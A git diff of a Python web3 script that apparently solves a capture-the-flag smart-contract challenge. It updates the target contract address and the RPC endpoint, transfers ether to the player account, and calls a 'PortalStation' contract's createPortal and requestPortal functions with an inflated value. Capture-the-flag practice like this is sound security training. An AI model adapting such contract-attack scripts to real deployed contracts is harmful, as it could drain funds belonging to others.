@@ -17,9 +17,9 @@ TargetContract = x["TargetAddress"]
 SetupContract =  x["setupAddress"]
 
 #Attack Contract address
-Target2Contract = "0xB89EcCb84C7CA4D2d28ecb49617982D4FF4c8CcE"
+Target2Contract = "0x2B5d196C89fed034a97fa56a87E520a0C5e0833C"
 
-url = 'http://157.245.43.189:30238/rpc'
+url = 'http://157.245.37.125:31610/rpc'
 
 w3 = Web3(Web3.HTTPProvider(url))
 block_number = w3.eth.block_number
@@ -77,6 +77,9 @@ install_solc("0.8.13")
 compiled = compile_files(["Portal.sol"], output_values=["abi"], solc_version="0.8.13")
 abi = compiled['Portal.sol:PortalStation']['abi']
 contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
+#compiled = compile_files(["Portal2.sol"], output_values=["abi"], solc_version="0.8.13")
+#abi = compiled['Portal2.sol:PortalStation']['abi']
+#contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
 
 #construct_txn = contract_instance2.functions.createPortal("elfKingdom").build_transaction(
 construct_txn = contract_instance2.functions.createPortal("orcKingdom").build_transaction(
@@ -99,6 +102,25 @@ tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
 tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
 print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
 
+sender_private_key = account_from['private_key']
+sender_address = "0x0000000000000000000000000000000000000000"
+receiver_address = account_from['address']
+
+# Build transaction
+transaction = {
+    'to': receiver_address,
+    'value': w3.to_wei(14, 'ether'),  # Amount in wei
+    'gas': 2000000,  # Adjust gas limit as needed
+    'gasPrice': w3.to_wei('50', 'gwei'),  # Adjust gas price as needed
+    #'nonce': w3.eth.get_transaction_count(sender_address),
+    'nonce': w3.eth.get_transaction_count(account_from['address']),
+}
+
+# Sign and send the transaction
+signed_transaction = w3.eth.account.sign_transaction(transaction, sender_private_key)
+transaction_hash = w3.eth.send_raw_transaction(signed_transaction.rawTransaction)
+
+
 construct_txn = contract_instance2.functions.requestPortal("orcKingdom").build_transaction(
         {
                 'from': account_from['address'],
@@ -106,7 +128,7 @@ construct_txn = contract_instance2.functions.requestPortal("orcKingdom").build_t
                 #'from': Target2Address,
                 #'nonce': w3.eth.get_transaction_count(Target2Address),
                 'chainId': w3.eth.chain_id,
-                'value' : 1338,
+                'value' : w3.to_wei(1338, 'ether'),
                 #"gasPrice": w3.to_wei(50, 'gwei'),
                 #"gas": 21000,
                 #"value": w3.to_wei("0", "ether"),
